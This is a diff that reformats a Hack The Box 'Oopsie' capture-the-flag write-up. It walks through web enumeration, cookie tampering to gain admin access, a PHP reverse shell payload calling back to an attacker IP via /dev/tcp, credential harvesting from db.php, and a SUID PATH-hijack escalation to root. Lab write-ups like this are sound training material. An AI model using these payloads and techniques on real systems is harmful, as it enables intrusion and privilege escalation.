@@ -1,204 +1,231 @@
-HTB Oopsie Writeup 
+# HTB Oopsie Writeup
 
- 
+**Difficulty:** Easy  
+**Focus Areas:** Web Enumeration, Access Control, Privilege Escalation, RCE  
+**Category:** Web / Linux – Starting Point  
+**Done by:** Razan Salah  
 
-Difficulty: Easy  
+---
 
-Focus Areas: Web Enumeration, Access Control, Privilege Escalation, RCE  
+## Overview
 
-Category: Web / Linux – starting point 
+Oopsie is a web-focused Hack The Box machine that demonstrates how low-severity vulnerabilities such as information disclosure and broken access control can be chained into full system compromise. The attack path begins with reconnaissance and web enumeration using Nmap, Gobuster, and Burp Suite to identify hidden functionality and weak access controls. By abusing insecure session handling and client-side trust, administrative functionality is exposed, allowing file upload abuse to achieve remote code execution through a PHP reverse shell. Post-exploitation enumeration reveals credential disclosure for lateral movement, followed by privilege escalation through a misconfigured SUID binary, ultimately resulting in root access.
 
-Done by: Razan Salah 
+---
 
-Overview 
+## 1. Reconnaissance
 
-Oopsie is a web-focused Hack The Box machine that demonstrates how low-severity vulnerabilities such as information disclosure and broken access control can be chained 
-into full system compromise. The attack path begins with reconnaissance and web enumeration using Nmap, Gobuster, and Burp Suite to identify hidden functionality and weak
-access controls. By abusing insecure session handling and client-side trust, administrative functionality is exposed, allowing file upload abuse to achieve remote code
-execution through a PHP reverse shell. Post-exploitation enumeration reveals credential disclosure for lateral movement, followed by privilege escalation through a
-misconfigured SUID binary, ultimately resulting in root access. 
+This phase focused on identifying exposed services and selecting the most viable initial attack surface.
 
-Reconnaissance: focused on identifying exposed services and selecting the most viable initial attack surface. 
+### A) Port Discovery
 
-A)Port Discovery: An Nmap scan was performed to identify open ports and running services on the target. 
+An Nmap scan was performed to identify open ports and running services on the target.
 
-Command: nmap -sC -sV 10.129.142.60 
+**Command:**
+```bash
+nmap -sC -sV 10.129.142.60
 
-![Nmap Scan](images/nmap-scan.png) 
-The scan revealed two exposed services: 22/tcp (SSH) & 80/tcp (HTTP)  
+The scan revealed two exposed services:
 
-SSH was accessible but not immediately useful without credentials, making the web service the primary target for further enumeration. 
+22/tcp (SSH)
+80/tcp (HTTP)
 
-B)Initial Web Inspection: Visiting the target in a browser presented a minimal automotive-themed web application. 
+SSH was accessible but not immediately useful without credentials, making the web service the primary target for further enumeration.
 
-![Landing Page](images/landing-page.png) 
-The links on the homepage do not seem to lead anywhere, however if we scroll down, we will 
-find a hint that the services can be accessed after logging in .
-According to this information, the website should have a login page. Before we proceed with directory and page enumeration, 
-we can try to map website by using Burp Suite proxy to passively spider the website. 
+B) Initial Web Inspection
 
- 
+Visiting the target in a browser presented a minimal automotive-themed web application.
 
-Web Enumeration: focused on identifying hidden routes and understanding how authentication was handled by the application. 
+The links on the homepage do not seem to lead anywhere. However, if we scroll down, we find a hint that the services can be accessed after logging in.
 
-Burp Mapping 
+According to this information, the website should have a login page. Before proceeding with directory and page enumeration, Burp Suite proxy was used to passively spider the website and map its structure.
 
-Burp Suite was used as a passive proxy to map the application during normal browsing. This revealed additional paths not visible from the homepage, including /cdn-cgi/login. 
-![Burp Sitemap](images/burp-sitemap.png) 
+2. Web Enumeration
 
-Initial Web Inspection: Visiting the target in a browser presented a minimal automotive-themed web application. 
+This phase focused on identifying hidden routes and understanding how authentication was handled by the application.
 
-![Landing Page](images/landing-page.png)
+A) Burp Mapping
 
-Login Discovery: Browsing to /cdn-cgi/login exposed the application login page. Standard login attempts were unsuccessful, but the application allowed access through a guest login option. 
+Burp Suite was used as a passive proxy to map the application during normal browsing. This revealed additional paths not visible from the homepage, including:
 
-It is possible to spot some directories and files that weren't visible while browsing. One that is indeed very interesting it's the directory of /cdn-cgi/login . We can visit it in our browser and indeed we are presented with the login page: 
+/cdn-cgi/login
 
-![Login Page](images/login-page.png) 
-Guest Access 
+B) Login Discovery
 
-After logging in as Guest, additional application functionality became visible, including navigation options not exposed to unauthenticated users. This confirmed that more functionality existed behind the login flow. 
+Browsing to /cdn-cgi/login exposed the application login page.
 
-![Guest Panel](images/guest-panel.png) 
-After navigating through the available pages, we spot that the only interesting one seems to be the Uploads. However it is not possible to access it as we need to have super admin rights: 
+Standard login attempts were unsuccessful, but the application allowed access through a guest login option.
 
- 
+It was possible to spot directories and files that were not visible while browsing. One particularly interesting directory was /cdn-cgi/login, which presented the login page.
 
-![Uploads page](images/uploads-page.png)
-4) Access Control Weakness  
+C) Guest Access
 
-This phase focused on analyzing how the application handled session data and access control. 
+After logging in as Guest, additional application functionality became visible, including navigation options not exposed to unauthenticated users. This confirmed that more functionality existed behind the login flow.
 
-Cookie Analysis 
+After navigating through the available pages, the only interesting one appeared to be Uploads. However, access was restricted because super admin rights were required.
 
-Session cookies were reviewed after guest authentication. The application stored role and user identifiers client-side, including values such as role=guest and user=2233. 
+3. Access Control Weakness
 
-![Guest Cookies](images/guest-cookies.png) 
-User Enumeration 
+This phase focused on analyzing how the application handled session data and access control.
 
-The application exposed user identifiers through the id parameter in the admin panel. Modifying this value allowed the enumeration of other users and revealed the administrator account identifier. 
+A) Cookie Analysis
 
-http://10.129.143.127/cdn-cgi/login/admin.php?content=accounts&id=2 
+Session cookies were reviewed after guest authentication. The application stored role and user identifiers client-side, including values such as:
 
-![User Enumeration](images/user-enumeration.png) 
-*note= the ip changed here from 10.129.142.60 to 10.129.143.127 because I turned off the machine and then restarted it on again.  
+role=guest
+user=2233
 
-Privilege Escalation to Admin 
+B) User Enumeration
 
-By modifying the session cookies from guest to admin values, administrative functionality became accessible, including the upload panel. 
+The application exposed user identifiers through the id parameter in the admin panel. Modifying this value allowed enumeration of other users and revealed the administrator account identifier.
 
-![Admin Access](images/admin-access.png) 
-5) Foothold (Initial Access) 
+http://10.129.143.127/cdn-cgi/login/admin.php?content=accounts&id=2
 
-This phase focused on abusing the administrative upload functionality to gain remote code execution. 
+Note: The IP changed here from 10.129.142.60 to 10.129.143.127 because the machine was turned off and restarted.
 
-File Upload Abuse: Administrative access exposed a file upload feature that accepted user-controlled files.  
+C) Privilege Escalation to Admin
 
-This functionality was used to upload a PHP reverse shell to the target. 
+By modifying the session cookies from guest to admin values, administrative functionality became accessible, including the upload panel.
 
-Payload Used: 
-?php 
-system("bash -c 'bash -i >& /dev/tcp/10.10.15.27/4444 0>&1'"); 
-?> 
-Upload panel:  
+4. Foothold (Initial Access)
 
- 
+This phase focused on abusing the administrative upload functionality to gain remote code execution.
 
-![Upload Panel](images/shell upload-panel.png)
-Reverse Shell Delivery: After uploading, the file location was identified under /uploads/ and the payload was triggered through the browser. The upload path was inferred logically and later confirmed through Gobuster enumeration. 
+A) File Upload Abuse
 
- 
+Administrative access exposed a file upload feature that accepted user-controlled files.
 
-Command:  gobuster dir --url http://{TARGET_IP}/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php 
+This functionality was used to upload a PHP reverse shell to the target.
 
-Before triggering the payload, a Netcat listener was started locally to receive the incoming reverse shell connection. 
+Payload Used:
 
-Command: nc -lvnp 4444 
+<?php
+system("bash -c 'bash -i >& /dev/tcp/10.10.15.27/4444 0>&1'");
+?>
 
-Once the uploaded PHP payload was executed, the target initiated a connection back to the listener and returned an interactive shell as www-data 
+Upload Panel:
 
-![Reverse Shell](images/reverse-shell.png)
-Initial Shell Access 
+B) Reverse Shell Delivery
 
-Triggering the uploaded payload returned command execution on the target as the www-data user, establishing initial access to the system and enabling post-exploitation enumeration. 
+After uploading, the file location was identified under /uploads/ and the payload was triggered through the browser. The upload path was inferred logically and later confirmed through Gobuster enumeration.
 
- 
+Command:
 
-6) Post-Exploitation Enumeration 
+gobuster dir --url http://{TARGET_IP}/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
 
-Post-exploitation focused on stabilizing the shell, enumerating application files, and identifying opportunities for lateral movement. 
+Before triggering the payload, a Netcat listener was started locally to receive the incoming reverse shell connection.
 
-Shell Stabilization: The initial reverse shell was upgraded to a fully interactive TTY to improve command execution and enable normal shell interaction. Command: python3 -c 'import pty; pty.spawn("/bin/bash")' 
+Command:
 
-Credential Discovery: Application files under the web root were reviewed for sensitive information. During enumeration, credentials were identified within application source files, revealing reusable authentication material. But they did not work. 
+nc -lvnp 4444
 
-Command: cat * | grep -i passw* from (/var/www/html/cdn-cgi/login) 
+Once the uploaded PHP payload was executed, the target initiated a connection back to the listener and returned an interactive shell as www-data.
 
-![Credential Discovery](images/credential-discovery.png) 
-C)Local User Enumeration: System users were reviewed to identify valid local accounts for lateral movement.                          Command: cat /etc/passwd  
+C) Initial Shell Access
 
-D)Pivot to Robert: Initial credentials were not directly reusable for local access, Further review of db.php revealed valid credentials for lateral movement.                 Command: cat db.php  
+Triggering the uploaded payload returned command execution on the target as the www-data user, establishing initial access to the system and enabling post-exploitation enumeration.
 
- 
+5. Post-Exploitation Enumeration
 
-![dp.php file](images/dp.phpfile.png) 
-![Robert Shell](images/robert-shell.png) 
-7) Privilege Escalation 
+Post-exploitation focused on stabilizing the shell, enumerating application files, and identifying opportunities for lateral movement.
 
-Privilege escalation focused on identifying local misconfigurations that could be abused to obtain root access. 
+A) Shell Stabilization
 
-Privilege Context Enumeration 
+The initial reverse shell was upgraded to a fully interactive TTY to improve command execution and enable normal shell interaction.
 
-let's check the basic commands for elevating privileges like( sudo –l) and (id): 
+Command:
 
-![elevating privileges](images/elevating-privileges.png) 
-the output of id confirmed that the user robert belonged to the bugtracker group, indicating a potential privilege escalation path through group-owned binaries. 
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+B) Credential Discovery
 
-SUID Enumeration 
+Application files under the web root were reviewed for sensitive information. During enumeration, credentials were identified within application source files, revealing reusable authentication material. However, they did not work.
 
-Further enumeration was performed to identify binaries associated with the bugtracker group. 
+Command:
 
-Command: find / -group bugtracker 2>/dev/null 
+cat * | grep -i passw*
 
-This revealed a binary located at /usr/bin/bugtracker. 
+Location:
 
-Bugtracker Analysis: The discovered binary was inspected to determine its behavior and execution context. Inspection confirmed that bugtracker was an SUID binary owned by root. 
+/var/www/html/cdn-cgi/login
 
-Command: ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker 
-        file /usr/bin/bugtracker 
+C) Local User Enumeration
 
-![Bugtracker SUID](images/bugtracker-suid.png)
-There is a suid set on that binary, which is a promising exploitation path. 
+System users were reviewed to identify valid local accounts for lateral movement.
 
-      D)    PATH Hijacking: The binary relied on the cat command without using an absolute path, making it vulnerable to PATH hijacking. A malicious cat executable was created in /tmp and used to override the expected system binary. 
+Command:
 
-Command: echo "/bin/sh" > /tmp/cat 
+cat /etc/passwd
+D) Pivot to Robert
 
-                         chmod +x /tmp/cat 
+Initial credentials were not directly reusable for local access. Further review of db.php revealed valid credentials for lateral movement.
 
-                         export PATH=/tmp:$PATH 
+Command:
 
-E)  Root Access: Executing bugtracker after modifying the PATH variable caused the application to invoke the malicious binary, resulting in a root shell. 
+cat db.php
 
-Command: bugtracker 
 
-![Root Shell](images/root-shell.png)
-8. Flags 
 
-User flag retrieved from /home/robert/user.txt  
 
-Root flag retrieved from /root/root.txt 
+6. Privilege Escalation
 
-9. Lessons Learned 
+Privilege escalation focused on identifying local misconfigurations that could be abused to obtain root access.
 
-Low-severity web flaws can become critical when chained together.  
+A) Privilege Context Enumeration
 
-Client-side trust should never be relied on for authorization.  
+Basic privilege escalation checks were performed:
 
-Unrestricted file upload can directly lead to remote code execution.  
+sudo -l
+id
 
-Application source files often expose credentials useful for post-exploitation.  
+The output of id confirmed that the user robert belonged to the bugtracker group, indicating a potential privilege escalation path through group-owned binaries.
 
-SUID binaries should be audited for unsafe execution behavior and PATH abuse.  
+B) SUID Enumeration
 
+Further enumeration was performed to identify binaries associated with the bugtracker group.
+
+Command:
+
+find / -group bugtracker 2>/dev/null
+
+This revealed a binary located at:
+
+/usr/bin/bugtracker
+C) Bugtracker Analysis
+
+The discovered binary was inspected to determine its behavior and execution context. Inspection confirmed that bugtracker was an SUID binary owned by root.
+
+Command:
+
+ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker
+file /usr/bin/bugtracker
+
+There is a SUID bit set on that binary, which is a promising exploitation path.
+
+D) PATH Hijacking
+
+The binary relied on the cat command without using an absolute path, making it vulnerable to PATH hijacking. A malicious cat executable was created in /tmp and used to override the expected system binary.
+
+Commands:
+
+echo "/bin/sh" > /tmp/cat
+chmod +x /tmp/cat
+export PATH=/tmp:$PATH
+E) Root Access
+
+Executing bugtracker after modifying the PATH variable caused the application to invoke the malicious binary, resulting in a root shell.
+
+Command:
+
+bugtracker
+
+7. Flags
+User flag retrieved from /home/robert/user.txt
+Root flag retrieved from /root/root.txt
+8. Lessons Learned
+Low-severity web flaws can become critical when chained together.
+Client-side trust should never be relied on for authorization.
+Unrestricted file upload can directly lead to remote code execution.
+Application source files often expose credentials useful for post-exploitation.
+SUID binaries should be audited for unsafe execution behavior and PATH abuse.
 Congratulations!
+
